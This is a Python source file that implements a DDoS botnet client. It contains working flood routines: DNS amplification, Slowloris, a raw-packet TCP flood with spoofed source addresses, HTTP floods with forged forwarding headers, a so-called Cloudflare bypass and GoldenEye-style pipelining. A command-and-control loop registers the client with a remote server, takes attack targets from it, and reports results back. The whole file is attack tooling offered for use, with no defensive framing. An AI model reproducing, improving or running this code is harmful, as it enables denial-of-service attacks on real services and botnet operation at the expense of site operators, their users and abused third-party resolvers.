# attack_methods.py - Improved Version (Backward Compatible)
import time
import socket
import random
import threading
import ssl
import struct
import requests
from urllib.parse import urlparse
import urllib3
import cloudscraper
from queue import Queue

# Disable warnings
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# Enhanced user agents
USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36 Edg/91.0.864.59",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36 OPR/77.0.4054.203",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:78.0) Gecko/20100101 Firefox/78.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Safari/605.1.15",
    "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:89.0) Gecko/20100101 Firefox/89.0"
]

# Thread management
MAX_THREADS = 2000  # Reduced to prevent overloading clients
active_threads = threading.Semaphore(MAX_THREADS)

# Target resolution with caching
_target_cache = {}
_cache_lock = threading.Lock()

def resolve_target(target):
    """Resolve a target (URL or IP) to IP address and port with caching"""
    with _cache_lock:
        if target in _target_cache and time.time() - _target_cache[target]['timestamp'] < 300:
            return _target_cache[target]['ip'], _target_cache[target]['port']
    
    try:
        # If it's already an IP:port format
        if ":" in target and not target.startswith("http"):
            parts = target.split(":")
            if len(parts) == 2:
                ip = parts[0]
                port = int(parts[1])
                with _cache_lock:
                    _target_cache[target] = {'ip': ip, 'port': port, 'timestamp': time.time()}
                return ip, port
        
        # Parse URL if it starts with http/https
        if target.startswith("http"):
            parsed = urlparse(target)
            hostname = parsed.hostname
            port = parsed.port or (443 if parsed.scheme == "https" else 80)
            # Resolve hostname to IP
            ip = socket.gethostbyname(hostname)
            with _cache_lock:
                _target_cache[target] = {'ip': ip, 'port': port, 'timestamp': time.time()}
            return ip, port
        else:
            # Assume it's a domain without scheme
            hostname = target
            port = 80
            ip = socket.gethostbyname(hostname)
            with _cache_lock:
                _target_cache[target] = {'ip': ip, 'port': port, 'timestamp': time.time()}
            return ip, port
    except Exception as e:
        raise ValueError(f"Could not resolve target: {target} - {str(e)}")

def attack_udp_amplification(target, duration):
    """Improved UDP amplification attack - less resource intensive"""
    ip, port = resolve_target(target)
    
    # DNS query for isc.org (large response) - common amplification vector
    dns_query = b'\x12\x34\x01\x00\x00\x01\x00\x00\x00\x00\x00\x01\x03isc\x03org\x00\x00\xff\x00\x01\x00\x00\x29\x10\x00\x00\x00\x00\x00\x00\x00'
    
    end_time = time.time() + duration
    packets_sent = 0
    
    def flood():
        nonlocal packets_sent
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.settimeout(0)
        
        while time.time() < end_time:
            try:
                # Send amplification payload to DNS port (reflects to target)
                sock.sendto(dns_query, (ip, 53))
                packets_sent += 1
                
                # Send direct UDP flood too
                sock.sendto(random._urandom(1024), (ip, port))
                packets_sent += 1
                
                # Small delay to prevent complete network saturation
                time.sleep(0.01)
            except:
                try:
                    sock.close()
                except:
                    pass
                sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                sock.settimeout(0)
    
    # Use multiple threads but not too many
    threads = []
    for _ in range(5):  # Reduced thread count
        t = threading.Thread(target=flood)
        t.daemon = True
        threads.append(t)
        t.start()
    
    for t in threads:
        try:
            t.join(timeout=duration + 1)
        except:
            pass
            
    print(f"UDP amplification completed. Sent {packets_sent} packets")

def attack_http_slowloris(target, duration):
    """Improved Slowloris attack - less resource intensive"""
    ip, port = resolve_target(target)
    use_ssl = port == 443
    
    # Create many partial connections
    sockets = []
    end_time = time.time() + duration
    
    # Create initial connection pool
    for _ in range(100):  # Reduced from 200
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(10)
            
            if use_ssl:
                context = ssl.create_default_context()
                context.check_hostname = False
                context.verify_mode = ssl.CERT_NONE
                sock = context.wrap_socket(sock, server_hostname=ip)
            
            sock.connect((ip, port))
            
            # Send partial request
            sock.send(f"GET /?{random.randint(0, 2000)} HTTP/1.1\r\n".encode())
            sock.send(f"Host: {ip}\r\n".encode())
            sock.send("User-Agent: {}\r\n".format(random.choice(USER_AGENTS)).encode())
            sock.send("Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n".encode())
            sock.send("Accept-Language: en-US,en;q=0.5\r\n".encode())
            sock.send("Accept-Encoding: gzip, deflate\r\n".encode())
            sock.send("X-Forwarded-For: {}.{}.{}.{}\r\n".format(
                random.randint(1, 255), random.randint(1, 255), 
                random.randint(1, 255), random.randint(1, 255)).encode())
            
            sockets.append(sock)
        except:
            pass
    
    # Keep connections alive by sending headers slowly
    while time.time() < end_time and sockets:
        for sock in list(sockets):  # Use list to avoid modification during iteration
            try:
                # Send another header every 15 seconds
                sock.send("X-a: {}\r\n".format(random.randint(1, 5000)).encode())
                time.sleep(15)
            except:
                sockets.remove(sock)
                try:
                    sock.close()
                except:
                    pass
                
        # Try to replenish closed connections
        if len(sockets) < 50:  # Reduced from 100
            for _ in range(100 - len(sockets)):
                try:
                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    sock.settimeout(10)
                    
                    if use_ssl:
                        context = ssl.create_default_context()
                        context.check_hostname = False
                        context.verify_mode = ssl.CERT_NONE
                        sock = context.wrap_socket(sock, server_hostname=ip)
                    
                    sock.connect((ip, port))
                    
                    # Send partial request
                    sock.send(f"GET /?{random.randint(0, 2000)} HTTP/1.1\r\n".encode())
                    sock.send(f"Host: {ip}\r\n".encode())
                    sock.send("User-Agent: {}\r\n".format(random.choice(USER_AGENTS)).encode())
                    
                    sockets.append(sock)
                except:
                    pass
    
    # Clean up
    for sock in sockets:
        try:
            sock.close()
        except:
            pass

def attack_tcp_mixed(target, duration):
    """Improved TCP mixed flood - less resource intensive"""
    ip, port = resolve_target(target)
    
    end_time = time.time() + duration
    packets_sent = 0
    
    def flood():
        nonlocal packets_sent
        while time.time() < end_time:
            try:
                # Create a raw socket if possible
                try:
                    sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
                    sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
                    use_raw = True
                except:
                    use_raw = False
                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    sock.settimeout(1)
                
                if use_raw:
                    # Craft TCP packet with various flags
                    source_ip = f"{random.randint(1, 255)}.{random.randint(1, 255)}.{random.randint(1, 255)}.{random.randint(1, 255)}"
                    source_port = random.randint(1024, 65535)
                    
                    # Random TCP flags (SYN, ACK, RST, FIN, URG, PSH)
                    tcp_flags = random.choice([
                        2,   # SYN
                        16,  # ACK
                        4,   # RST
                        1,   # FIN
                        32,  # URG
                        8    # PSH
                    ])
                    
                    # IP header
                    ip_ver = 4
                    ip_ihl = 5
                    ip_tos = 0
                    ip_tot_len = 40  # IP header + TCP header
                    ip_id = random.randint(1, 65535)
                    ip_frag_off = 0
                    ip_ttl = 255
                    ip_proto = socket.IPPROTO_TCP
                    ip_check = 0
                    ip_saddr = socket.inet_aton(source_ip)
                    ip_daddr = socket.inet_aton(ip)
                    
                    ip_header = struct.pack('!BBHHHBBH4s4s', 
                                          (ip_ver << 4) + ip_ihl,
                                          ip_tos,
                                          ip_tot_len,
                                          ip_id,
                                          ip_frag_off,
                                          ip_ttl,
                                          ip_proto,
                                          ip_check,
                                          ip_saddr,
                                          ip_daddr)
                    
                    # TCP header
                    tcp_source = source_port
                    tcp_dest = port
                    tcp_seq = random.randint(0, 4294967295)
                    tcp_ack_seq = 0
                    tcp_doff = 5
                    tcp_window = socket.htons(5840)
                    tcp_check = 0
                    tcp_urg_ptr = 0
                    
                    tcp_offset_res = (tcp_doff << 4)
                    
                    tcp_header = struct.pack('!HHLLBBHHH', 
                                           tcp_source, tcp_dest,
                                           tcp_seq, tcp_ack_seq,
                                           tcp_offset_res, tcp_flags,
                                           tcp_window, tcp_check, tcp_urg_ptr)
                    
                    # Pseudo header for checksum
                    source_address = socket.inet_aton(source_ip)
                    dest_address = socket.inet_aton(ip)
                    placeholder = 0
                    protocol = socket.IPPROTO_TCP
                    tcp_length = len(tcp_header)
                    
                    psh = struct.pack('!4s4sBBH', 
                                     source_address, 
                                     dest_address, 
                                     placeholder, 
                                     protocol, 
                                     tcp_length)
                    psh = psh + tcp_header
                    
                    # Calculate checksum
                    tcp_check = checksum(psh)
                    
                    # Repack with correct checksum
                    tcp_header = struct.pack('!HHLLBBHHH', 
                                           tcp_source, tcp_dest,
                                           tcp_seq, tcp_ack_seq,
                                           tcp_offset_res, tcp_flags,
                                           tcp_window, tcp_check, tcp_urg_ptr)
                    
                    # Send packet
                    packet = ip_header + tcp_header
                    sock.sendto(packet, (ip, 0))
                    packets_sent += 1
                else:
                    # Fallback to regular socket method with various operations
                    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    s.settimeout(1)
                    try:
                        s.connect((ip, port))
                        # Random action: send data, close immediately, or keep open
                        action = random.randint(0, 2)
                        if action == 0:
                            s.send(b"GET / HTTP/1.1\r\nHost: " + ip.encode() + b"\r\n\r\n")
                            time.sleep(0.1)
                        elif action == 1:
                            s.close()
                        else:
                            # Keep connection open for a while
                            time.sleep(2)
                        s.close()
                    except:
                        pass
                    
                # Small delay
                time.sleep(0.01)  # Increased from 0.001
            except Exception as e:
                time.sleep(0.01)
    
    # Start more threads for raw socket flood
    threads = []
    thread_count = 200  # Reduced from 100/50
    
    for _ in range(thread_count):
        t = threading.Thread(target=flood)
        t.daemon = True
        threads.append(t)
        t.start()
    
    time.sleep(duration)
    
    # Clean up
    try:
        sock.close()
    except:
        pass
    
    for t in threads:
        try:
            t.join(timeout=1.0)
        except:
            pass
            
    print(f"TCP mixed attack completed. Sent {packets_sent} packets")

def attack_http_requests(target, duration):
    """Improved HTTP requests - more effective and less resource intensive"""
    ip, port = resolve_target(target)
    use_ssl = port == 443
    protocol = "https://" if use_ssl else "http://"
    url = f"{protocol}{ip}:{port}/"
    
    # List of common paths to request
    paths = [
        "", "/", "/admin", "/wp-admin", "/login", "/api", "/static",
        "/images", "/css", "/js", "/blog", "/news", "/contact"
    ]
    
    # Common parameters to make requests unique
    params = [
        "id", "page", "category", "search", "view", "sort", 
        "filter", "type", "action", "cmd", "q", "s"
    ]
    
    end_time = time.time() + duration
    requests_sent = 0
    
    def flood():
        nonlocal requests_sent
        session = requests.Session()
        session.verify = False
        session.timeout = 5
        
        while time.time() < end_time:
            try:
                path = random.choice(paths)
                param = random.choice(params)
                value = random.randint(1, 10000)
                full_url = url + path + f"?{param}={value}"
                
                headers = {
                    'User-Agent': random.choice(USER_AGENTS),
                    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
                    'Accept-Language': 'en-US,en;q=0.5',
                    'Accept-Encoding': 'gzip, deflate',
                    'Connection': 'keep-alive',
                    'Upgrade-Insecure-Requests': '1',
                    'Cache-Control': 'max-age=0',
                    'X-Forwarded-For': f"{random.randint(1, 255)}.{random.randint(1, 255)}.{random.randint(1, 255)}.{random.randint(1, 255)}",
                    'X-Real-IP': f"{random.randint(1, 255)}.{random.randint(1, 255)}.{random.randint(1, 255)}.{random.randint(1, 255)}",
                }
                
                # Randomly add more headers to make requests unique
                if random.random() > 0.5:
                    headers['Referer'] = random.choice([
                        'https://www.google.com/', 
                        'https://www.bing.com/', 
                        'https://www.yahoo.com/',
                        'https://www.facebook.com/'
                    ])
                
                # Make the request
                response = session.get(full_url, headers=headers, timeout=5)
                requests_sent += 1
                
                # Random delay between requests
                time.sleep(random.uniform(0.05, 0.2))  # More reasonable delays
                
            except Exception as e:
                # On error, create a new session
                try:
                    session.close()
                except:
                    pass
                session = requests.Session()
                session.verify = False
                session.timeout = 5
                time.sleep(0.5)
    
    # Start many threads for HTTP requests
    threads = []
    for _ in range(50):  # Reduced from 100
        t = threading.Thread(target=flood)
        t.daemon = True
        threads.append(t)
        t.start()
    
    time.sleep(duration)
    
    for t in threads:
        try:
            t.join(timeout=1.0)
        except:
            pass
            
    print(f"HTTP requests attack completed. Sent {requests_sent} requests")

def attack_cloudflare_bypass(target, duration):
    """Improved Cloudflare bypass - more realistic attempts"""
    ip, port = resolve_target(target)
    
    # Use cloudscraper to bypass simple challenges
    scraper = cloudscraper.create_scraper()
    
    # Try to get real IP behind Cloudflare
    # Common Cloudflare bypass techniques (this is just a simulation)
    bypass_headers = [
        {"X-Forwarded-For": ip},
        {"X-Real-IP": ip},
        {"CF-Connecting-IP": ip},
        {"True-Client-IP": ip},
        {"X-Originating-IP": ip},
        {"X-Remote-IP": ip},
        {"X-Remote-Addr": ip},
        {"X-Client-IP": ip},
        {"X-Host": ip},
        {"X-Forwared-Host": ip}
    ]
    
    end_time = time.time() + duration
    requests_sent = 0
    
    def bypass_attempt():
        nonlocal requests_sent
        session = requests.Session()
        session.verify = False
        
        while time.time() < end_time:
            try:
                # Try different bypass techniques
                headers = {
                    'User-Agent': random.choice(USER_AGENTS),
                    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
                    'Accept-Language': 'en-US,en;q=0.5',
                    'Accept-Encoding': 'gzip, deflate',
                    'Connection': 'keep-alive',
                }
                
                # Add bypass headers
                headers.update(random.choice(bypass_headers))
                
                # Try with cloudscraper first
                try:
                    response = scraper.get(f"http://{ip}:{port}/", headers=headers, timeout=5)
                    if response.status_code < 500:
                        requests_sent += 1
                except:
                    pass
                
                # Also try direct requests
                try:
                    response = session.get(f"http://{ip}:{port}/", headers=headers, timeout=5)
                    requests_sent += 1
                except:
                    pass
                
                time.sleep(0.1)
            except:
                try:
                    session.close()
                except:
                    pass
                session = requests.Session()
                session.verify = False
                time.sleep(0.5)
    
    threads = []
    for _ in range(30):  # Reduced from 50
        t = threading.Thread(target=bypass_attempt)
        t.daemon = True
        threads.append(t)
        t.start()
    
    time.sleep(duration)
    
    for t in threads:
        try:
            t.join(timeout=1.0)
        except:
            pass
            
    print(f"Cloudflare bypass attempt completed. Sent {requests_sent} requests")

def attack_goldeneye(target, duration):
    """Improved GoldenEye attack - less resource intensive"""
    ip, port = resolve_target(target)
    use_ssl = port == 443
    
    end_time = time.time() + duration
    requests_sent = 0
    
    def goldeneye():
        nonlocal requests_sent
        while time.time() < end_time:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(10)
                
                if use_ssl:
                    context = ssl.create_default_context()
                    context.check_hostname = False
                    context.verify_mode = ssl.CERT_NONE
                    sock = context.wrap_socket(sock, server_hostname=ip)
                
                sock.connect((ip, port))
                
                # Build a pipeline of requests
                pipeline = ""
                for i in range(random.randint(3, 10)):  # Reduced from 5-20
                    path = '/' + ''.join(random.choices('abcdefghijklmnopqrstuvwxyz', k=random.randint(3, 10)))
                    pipeline += f"GET {path} HTTP/1.1\r\n"
                    pipeline += f"Host: {ip}\r\n"
                    pipeline += f"User-Agent: {random.choice(USER_AGENTS)}\r\n"
                    pipeline += "Connection: keep-alive\r\n"
                    pipeline += f"X-Forwarded-For: {random.randint(1, 255)}.{random.randint(1, 255)}.{random.randint(1, 255)}.{random.randint(1, 255)}\r\n"
                    pipeline += "\r\n"
                
                # Send the pipelined requests
                sock.send(pipeline.encode())
                requests_sent += pipeline.count("GET ")
                
                # Keep connection open for a bit
                time.sleep(random.uniform(0.5, 2))
                
                sock.close()
                
            except Exception as e:
                try:
                    sock.close()
                except:
                    pass
                time.sleep(0.1)
    
    threads = []
    for _ in range(100):  # Reduced from 75
        t = threading.Thread(target=goldeneye)
        t.daemon = True
        threads.append(t)
        t.start()
    
    time.sleep(duration)
    
    for t in threads:
        try:
            t.join(timeout=1.0)
        except:
            pass
            
    print(f"GoldenEye attack completed. Sent {requests_sent} requests")

def checksum(data):
    """Calculate checksum for packets"""
    if len(data) % 2 != 0:
        data += b'\0'
    
    s = 0
    for i in range(0, len(data), 2):
        w = (data[i] << 8) + data[i+1]
        s += w
    
    s = (s >> 16) + (s & 0xffff)
    s = ~s & 0xffff
    return s

# Attack dispatcher with new methods (maintaining backward compatibility)
ATTACK_METHODS = {
    "udp_amp": attack_udp_amplification,
    "slowloris": attack_http_slowloris,
    "tcp_mixed": attack_tcp_mixed,
    "http_requests": attack_http_requests,
    "cloudflare_bypass": attack_cloudflare_bypass,
    "goldeneye": attack_goldeneye,
    # Keep original methods for backward compatibility
    "udp_god": attack_udp_amplification,
    "http_flood": attack_http_requests,
    "tcp_syn": attack_tcp_mixed,
    "hammer": attack_http_requests,
}

def launch_attack(method, target, duration):
    """Launch an attack with the specified method"""
    if method in ATTACK_METHODS:
        print(f"Starting {method} attack on {target} for {duration} seconds")
        start_time = time.time()
        ATTACK_METHODS[method](target, duration)
        end_time = time.time()
        print(f"{method} attack on {target} completed in {end_time - start_time:.2f} seconds")
    else:
        print(f"Unknown attack method: {method}")

# Server communication functions
def register_with_server(server_url, client_id, attack_methods):
    """Register client with the server"""
    try:
        response = requests.post(
            f"{server_url}/register",
            json={
                "client_id": client_id,
                "attack_methods": attack_methods,
                "status": "online",
                "threads": MAX_THREADS
            },
            timeout=10,
            verify=False
        )
        return response.status_code == 200
    except:
        return False

def get_attack_command(server_url, client_id):
    """Get attack command from server"""
    try:
        response = requests.get(
            f"{server_url}/command/{client_id}",
            timeout=5,
            verify=False
        )
        if response.status_code == 200:
            return response.json()
    except:
        pass
    return None

def send_attack_result(server_url, client_id, result):
    """Send attack result to server"""
    try:
        response = requests.post(
            f"{server_url}/result/{client_id}",
            json=result,
            timeout=10,
            verify=False
        )
        return response.status_code == 200
    except:
        return False

def client_loop(server_url, client_id):
    """Main client loop that communicates with server"""
    # Register with server
    if not register_with_server(server_url, client_id, list(ATTACK_METHODS.keys())):
        print("Failed to register with server")
        return
    
    print("Registered with server, waiting for commands...")
    
    while True:
        # Check for attack commands
        command = get_attack_command(server_url, client_id)
        if command:
            print(f"Received command: {command}")
            
            # Execute the attack
            method = command.get("method")
            target = command.get("target")
            duration = command.get("duration", 60)
            
            if method and target:
                try:
                    # Launch the attack
                    launch_attack(method, target, duration)
                    
                    # Send result to server
                    send_attack_result(server_url, client_id, {
                        "status": "completed",
                        "method": method,
                        "target": target,
                        "duration": duration
                    })
                except Exception as e:
                    # Send error to server
                    send_attack_result(server_url, client_id, {
                        "status": "error",
                        "method": method,
                        "target": target,
                        "duration": duration,
                        "error": str(e)
                    })
            else:
                print("Invalid command: missing method or target")
        
        # Wait before checking again
        time.sleep(5)

if __name__ == "__main__":
    import sys
    if len(sys.argv) != 3:
        print("Usage: python attack_methods.py <server_url> <client_id>")
        sys.exit(1)
    
    server_url = sys.argv[1]
    client_id = sys.argv[2]
    
    client_loop(server_url, client_id)
